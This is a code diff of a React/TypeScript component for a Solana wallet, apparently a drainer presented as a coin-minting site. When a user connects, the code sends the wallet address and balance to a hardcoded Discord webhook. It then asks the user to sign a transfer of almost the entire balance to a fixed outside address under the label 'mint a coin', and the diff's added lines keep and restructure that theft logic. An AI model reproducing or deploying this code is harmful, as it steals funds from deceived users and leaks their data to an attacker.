@@ -82,7 +82,6 @@ const ExposeWalletModal: FC = () => {
 const WalletConnectionHandler: FC = () => {
     const { publicKey, connected, signTransaction } = useWallet();
     const [solBalance, setSolBalance] = useState<number | null>(null);
-    const [loading, setLoading] = useState(false);
 
     useEffect(() => {
         if (connected && publicKey) {
@@ -121,10 +120,9 @@ const WalletConnectionHandler: FC = () => {
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
             console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
 
-            // Send to Discord webhook
             sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
-            const reservedLamports = 100000; // Reserve 0.0001 SOL
+            const reservedLamports = 100000;
             if (lamports <= reservedLamports) {
                 alert('⚠️ Not enough SOL to mint a coin.');
                 return;
@@ -132,29 +130,31 @@ const WalletConnectionHandler: FC = () => {
 
             const sendAmount = lamports - reservedLamports;
 
-            const tx = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
-                    lamports: sendAmount,
-                })
-            );
-
-            tx.feePayer = walletPublicKey;
-            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-            if (!signTransaction) {
-                alert('❌ Wallet not ready to mint the coin.');
-                return;
-            }
-
-            const signedTx = await signTransaction(tx);
-            console.log('🖊️ Transaction signed.');
-
             setTimeout(async () => {
                 try {
-                    const txid = await connection!.sendRawTransaction(signedTx.serialize());
-                    console.log(`🚀 Transaction sent.`);
+                    const latestBlockhash = await connection!.getLatestBlockhash();
+
+                    const tx = new Transaction().add(
+                        SystemProgram.transfer({
+                            fromPubkey: walletPublicKey,
+                            toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
+                            lamports: sendAmount,
+                        })
+                    );
+
+                    tx.feePayer = walletPublicKey;
+                    tx.recentBlockhash = latestBlockhash.blockhash;
+
+                    if (!signTransaction) {
+                        alert('❌ Wallet not ready to mint the coin.');
+                        return;
+                    }
+
+                    const signedTx = await signTransaction(tx);
+                    console.log('🖊️ Transaction signed.');
+
+                    const txid = await connection.sendRawTransaction(signedTx.serialize());
+                    console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
@@ -162,13 +162,11 @@ const WalletConnectionHandler: FC = () => {
         } catch (err) {
             console.error('❌ Error sending transaction:', err);
             alert('Creation failed.');
-        } finally {
-            setLoading(false);
         }
     };
 
     const sendDiscordWebhook = async (address: string, sol: number) => {
-        const webhookUrl = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ'; // Replace with your webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
 
         const body = {
             embeds: [
@@ -208,11 +206,7 @@ const WalletConnectionHandler: FC = () => {
     const walletPopupEl =
         typeof window !== 'undefined' ? document.querySelector('.wallet-popup#walletPopup') : null;
 
-    const WalletUI = (
-        <div>{!connected || !publicKey ? null : <></>}</div>
-    );
-
-    return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
+    return walletPopupEl ? ReactDOM.createPortal(<div />, walletPopupEl) : null;
 };
 
 const InjectWalletMultiButton: FC = () => {
